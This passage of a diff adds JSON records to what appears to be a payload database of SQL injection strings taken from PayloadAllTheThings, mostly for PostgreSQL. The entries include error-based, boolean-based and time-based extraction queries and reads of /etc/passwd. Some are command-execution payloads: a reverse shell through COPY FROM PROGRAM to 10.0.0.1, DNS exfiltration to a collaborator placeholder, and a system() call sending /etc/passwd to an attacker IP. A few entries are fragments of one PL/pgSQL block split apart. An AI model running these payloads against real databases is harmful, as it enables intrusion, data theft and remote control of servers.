+      "content": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-E14CC595DBC7",
+      "content": "print_r(mysql_error());",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-B374CD9291A0",
+      "content": "CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-BED7C18368B7",
+      "content": "CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-DF4B25C3FE4A",
+      "content": "CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-EA7BE9E7DD1F",
+      "content": "CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-F5A2206AC19F",
+      "content": "' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-6F909F061D0E",
+      "content": "' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-600998EA4F24",
+      "content": "' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-1FE81EE4F0EC",
+      "content": "' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-7490B3388891",
+      "content": "SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-8F23F940E876",
+      "content": "SELECT database_to_xml(true,true,''); -- dump the current database to XML",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-6BC50E555CA8",
+      "content": "SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-AA0DAE7CFAC3",
+      "content": "' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-AB71E2D650EA",
+      "content": "' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-57A8352348BE",
+      "content": "select 1 from pg_sleep(5)",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-5BFE57C8A5DA",
+      "content": ";(select 1 from pg_sleep(5))",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-26CF5355166F",
+      "content": "||(select 1 from pg_sleep(5))",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-031ECEAAC020",
+      "content": "select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-46C3D03EE070",
+      "content": "select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-AF51DC8347D0",
+      "content": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-98836D220AE1",
+      "content": "select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-EED8A0A9E240",
+      "content": "AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-1BDE31948A2E",
+      "content": "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-6109783E4195",
+      "content": "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-4F676C1BF024",
+      "content": "declare c text;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-EA74A2C9D798",
+      "content": "declare p text;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-8D589AFA4DFA",
+      "content": "begin",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-0F452AFBA918",
+      "content": "SELECT into p (SELECT YOUR-QUERY-HERE);",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-22B5313E20AF",
+      "content": "c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-95BDC725A5C6",
+      "content": "execute c;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-3450A92350F1",
+      "content": "END;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-472214CADC65",
+      "content": "$$ language plpgsql security definer;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-22D0E3914A9F",
+      "content": "SELECT f();",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-DF2FF1A37716",
+      "content": "SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-0623BF50D43B",
+      "content": "select pg_ls_dir('./');",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-8AF7CEDCB45C",
+      "content": "select pg_read_file('PG_VERSION', 0, 200);",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-5635A7A284DB",
+      "content": "CREATE TABLE temp(t TEXT);",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-607E615F70B3",
+      "content": "COPY temp FROM '/etc/passwd';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-5B9FE26D155D",
+      "content": "SELECT * FROM temp limit 1 offset 0;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-837436CEB501",
+      "content": "SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-AFFBE4DA2DB9",
+      "content": "SELECT lo_get(16420); -- use the OID returned from the above",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-1BCAAF520817",
+      "content": "SELECT * from pg_largeobject; -- or just get all the large objects and their data",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-496DE14899AD",
+      "content": "CREATE TABLE nc (t TEXT);",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-C731F5ACE9B2",
+      "content": "INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-8EDAB214F05E",
+      "content": "SELECT * FROM nc;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-22A7D9E0DB79",
+      "content": "COPY nc(t) TO '/tmp/nc.sh';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-752A5FEDE586",
+      "content": "COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-5FCCEE38DCB9",
+      "content": "SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-942FEBE4DE96",
+      "content": "SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-DE68FDCFAB5B",
+      "content": "SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-A7F338C7A1AD",
+      "content": "COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-598EEEEA3986",
+      "content": "COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-B4D2AE65273A",
+      "content": "CREATE TABLE shell(output text);",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-3E2095B808FB",
+      "content": "COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-5766B707F638",
+      "content": "CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-EEAF1FDB6801",
+      "content": "SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-52D4552FF43D",
+      "content": "SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-B44E2A841BE8",
+      "content": "SHOW is_superuser;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-7A3460D6792F",
+      "content": "SELECT current_setting('is_superuser');",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-E41BAEEA71B7",
+      "content": "SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;",
+      "category": "sqli-postgresql",
+      "source": "PayloadAllTheThings-PostgreSQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    }
+  ]
+}
